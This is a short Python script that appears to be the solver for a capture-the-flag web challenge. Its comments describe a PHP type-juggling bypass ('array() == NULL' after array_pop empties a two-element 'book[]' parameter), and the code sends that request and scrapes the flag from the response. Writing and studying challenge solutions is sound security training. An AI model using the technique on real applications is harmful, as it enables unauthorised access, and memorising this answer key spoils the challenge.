import os
import re
import sys

import requests

# PHP type juggling at `$book == NULL`.
#
# index.php lets $_GET['book'] be an array. If `del` is also set, it calls
# array_pop($book) `del` times. Passing two array elements (so the initial
# count(book) <= 1 check is bypassed) with del=2 pops both elements, leaving
# $book as an empty array. In PHP, `array(0) == NULL` evaluates to true, so
# the `$book == NULL` branch fires and the real flag is echoed inside a
# `popup()` JS alert: <script>alert(`...`);</script>
endpoint = os.environ["SERVICE_APP_MAIN_ENDPOINT"]
url = f"{endpoint}/"
params = [("book[]", "a"), ("book[]", "b"), ("del", "2")]

response = requests.get(url, params=params, timeout=10)
response.raise_for_status()

match = re.search(r"alert\(`(.*?)`\)", response.text)
if not match:
    print("flag not found in response:")
    print(response.text)
    sys.exit(1)

print(match.group(1))
